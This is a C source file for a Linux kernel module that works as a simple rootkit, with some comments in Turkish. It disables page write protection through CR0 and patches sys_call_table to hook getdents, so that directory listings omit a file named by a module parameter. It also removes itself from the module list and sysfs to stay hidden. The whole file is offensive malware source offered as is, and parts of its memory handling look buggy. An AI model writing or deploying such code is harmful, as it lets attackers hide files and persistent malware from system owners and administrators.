#include <linux/init.h>
#include <linux/module.h>
#include <linux/moduleparam.h>
#include <linux/syscalls.h>
#include <linux/kallsyms.h>
#include <linux/slab.h>
#include <linux/kern_levels.h>
#include <linux/gfp.h>
#include <asm/unistd.h>
#include <asm/paravirt.h>
#include <linux/kernel.h>



MODULE_LICENSE("GPL");



unsigned long **SYS_CALL_TABLE;



void EnablePageWriting(void){
    write_cr0(read_cr0() & (~0x10000));  // Syscalltable yazma izni ac

} 
void DisablePageWriting(void){
    write_cr0(read_cr0() | 0x10000);    //Syscalltable yazma izni kapat

} 



void module_hide(void) {
   list_del(&THIS_MODULE->list);             //remove from procfs
   kobject_del(&THIS_MODULE->mkobj.kobj);    //remove from sysfs
   THIS_MODULE->sect_attrs = NULL;
   THIS_MODULE->notes_attrs = NULL;
}


struct linux_dirent {
    unsigned long     d_ino;    /* Inode  */
    unsigned long     d_off;      /* linux_dirent */
    unsigned short  d_reclen; // d_reclen 
    char              d_name[];  
}*dirp2 , *dirp3 , *retn;   // directory pointer


static char *hide;
module_param(hide, charp, 0000);
MODULE_PARM_DESC(hide, "A character string");



asmlinkage int ( *original_getdents ) (unsigned int fd, struct linux_dirent *dirp, unsigned int count); 

 
asmlinkage int  HookGetDents(unsigned int fd, struct linux_dirent *dirp, unsigned int count){

  struct linux_dirent *retn, *dirp3; 
  int Records, RemainingBytes, length;

  Records = (*original_getdents) (fd, dirp, count);

  if (Records <= 0){
    return Records;
  }

  retn = (struct linux_dirent *) kmalloc(Records, GFP_KERNEL);

  copy_from_user(retn, dirp, Records);

  dirp3 = retn;
  RemainingBytes = Records;
  

  while(RemainingBytes > 0){
    length = dirp3->d_reclen;
    RemainingBytes -= dirp3->d_reclen;
  
    printk(KERN_INFO "RemainingBytes %d   \t File: %s " ,  RemainingBytes , dirp3->d_name );

    if(strcmp( (dirp3->d_name) , hide ) == 0){
      memcpy(dirp3, (char*)dirp3+dirp3->d_reclen, RemainingBytes);
      Records -= length; //  dirp3->d_reclen;
    }
    dirp3 = (struct linux_dirent *) ((char *)dirp3 + dirp3->d_reclen);

  }

  copy_to_user(dirp, retn, Records);
  kfree(retn);
  return Records;
}


// Set up hooks.
static int __init SetHooks(void) {
      //kallsyms ile veri cekiyoz
    module_hide(); 
    SYS_CALL_TABLE = (unsigned long**)kallsyms_lookup_name("sys_call_table"); 

    printk(KERN_INFO "Hooks Will Be Set.\n");
    printk(KERN_INFO "System call table at %p\n", SYS_CALL_TABLE);

  // Opens the memory pages to be written
    EnablePageWriting();

  // Replaces Pointer Of Syscall_open on our syscall.
    original_getdents = (void*)SYS_CALL_TABLE[__NR_getdents];
    SYS_CALL_TABLE[__NR_getdents] = (unsigned long*)HookGetDents;
    DisablePageWriting();

    return 0;
}







static void __exit HookCleanup(void) {

    // Clean up our Hooks
    EnablePageWriting();
    SYS_CALL_TABLE[__NR_getdents] = (unsigned long*)original_getdents;
    DisablePageWriting();
    printk(KERN_INFO "HooksCleaned Up!");
}

module_init(SetHooks);
module_exit(HookCleanup);
